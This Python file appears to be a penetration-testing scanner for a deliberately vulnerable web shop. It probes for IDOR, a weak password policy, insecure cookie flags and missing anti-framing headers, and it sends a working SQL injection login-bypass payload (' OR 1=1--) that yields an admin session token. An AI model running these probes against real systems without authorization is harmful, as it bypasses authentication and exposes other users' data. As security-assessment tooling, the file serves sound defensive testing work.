import time
import requests

Finding = dict

def register_and_login(base_url: str) -> tuple[requests.Session, str, int]:
    s = requests.Session()
    email = f"pentest-{int(time.time() * 1000)}@example.com"
    password = "TestPass123!"

    reg = s.post(f"{base_url}/api/Users", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1}, "securityAnswer": "n/a",
    })
    if reg.status_code not in (200, 201):
        raise RuntimeError(f"Registration failed ({reg.status_code}): {reg.text[:200]}")

    login = s.post(f"{base_url}/rest/user/login", json={"email": email, "password": password})
    if login.status_code != 200:
        raise RuntimeError(f"Login failed ({login.status_code}): {login.text[:200]}")

    auth = login.json().get("authentication", {})
    token = auth.get("token")
    basket_id = auth.get("bid")
    s.headers["Authorization"] = f"Bearer {token}"
    return s, email, basket_id

def check_idor(base_url: str) -> list[Finding]:
    findings: list[Finding] = []
    sess_a, _, bid_a = register_and_login(base_url)
    sess_b, _, _ = register_and_login(base_url)

    add = sess_a.post(f"{base_url}/api/BasketItems", json={"ProductId": 1, "BasketId": bid_a, "quantity": 1})
    if add.status_code not in (200, 201):
        return findings
    item_id = add.json().get("data", {}).get("id")
    if item_id is None:
        return findings

    resp = sess_b.get(f"{base_url}/api/BasketItems/{item_id}")
    if resp.status_code == 200 and str(item_id) in resp.text:
        findings.append({
            "category": "A01: Broken Access Control (IDOR)",
            "tool": "HTTP (dual account, API-level)",
            "severity": "High",
            "description": "A second, unrelated authenticated account read another user's "
                           "basket item by requesting its object ID directly. The server "
                           "performs no ownership check on /api/BasketItems/<id>.",
            "endpoint": f"{base_url}/api/BasketItems/{item_id}",
            "evidence": resp.text[:500],
        })
    return findings

def check_auth(base_url: str) -> list[Finding]:
    findings: list[Finding] = []

    weak_email = f"weakpw-{int(time.time() * 1000)}@example.com"
    resp = requests.post(f"{base_url}/api/Users", json={
        "email": weak_email, "password": "a", "passwordRepeat": "a",
        "securityQuestion": {"id": 1}, "securityAnswer": "n/a",
    })
    if resp.status_code in (200, 201):
        findings.append({
            "category": "A07: Broken Authentication",
            "tool": "HTTP (API-level policy check)",
            "severity": "Medium",
            "description": "Account registration accepted a single-character password — "
                           "no meaningful password strength policy is enforced.",
            "endpoint": f"{base_url}/api/Users",
            "evidence": f"Registration succeeded with password 'a' (status {resp.status_code})",
        })

    root = requests.get(f"{base_url}/")
    for cookie in root.cookies:
        name = cookie.name.lower()
        if "session" in name or "token" in name:
            secure = cookie.secure
            httponly = bool(cookie._rest.get("HttpOnly")) if hasattr(cookie, "_rest") else False
            if not secure or not httponly:
                findings.append({
                    "category": "A07: Broken Authentication",
                    "tool": "HTTP (cookie inspection)",
                    "severity": "Medium",
                    "description": f"Cookie '{cookie.name}' is missing HttpOnly and/or Secure flags.",
                    "endpoint": base_url,
                    "evidence": f"name={cookie.name} secure={secure} httponly={httponly}",
                })
    return findings

def check_sqli(base_url: str) -> list[Finding]:
    findings: list[Finding] = []
    payload = "' OR 1=1--"
    resp = requests.post(f"{base_url}/rest/user/login", json={"email": payload, "password": "x"})
    if resp.status_code == 200:
        try:
            auth = resp.json().get("authentication", {})
        except ValueError:
            auth = {}
        if auth.get("token"):
            findings.append({
                "category": "A03: Injection (SQLi)",
                "tool": "HTTP (SQLi auth-bypass PoC)",
                "severity": "High",
                "description": "The login endpoint is vulnerable to SQL injection. A crafted "
                               "email value bypasses authentication entirely and logs in as the "
                               "first user in the database — unsanitized input reaches the SQL query.",
                "endpoint": f"{base_url}/rest/user/login",
                "evidence": f"POST email=\"{payload}\" -> 200; authenticated as "
                            f"{auth.get('umail', '(admin)')} with a valid session token issued.",
            })
    return findings

def check_clickjacking(base_url: str) -> list[Finding]:
    findings: list[Finding] = []
    resp = requests.get(f"{base_url}/")
    xfo = resp.headers.get("X-Frame-Options")
    csp = resp.headers.get("Content-Security-Policy", "")
    if not xfo and "frame-ancestors" not in csp.lower():
        findings.append({
            "category": "Clickjacking",
            "tool": "HTTP (header inspection)",
            "severity": "Medium",
            "description": "No X-Frame-Options header and no CSP frame-ancestors directive — "
                           "the page can be framed by any origin.",
            "endpoint": base_url,
            "evidence": f"X-Frame-Options={xfo!r} CSP={csp[:120]!r}",
        })
    return findings
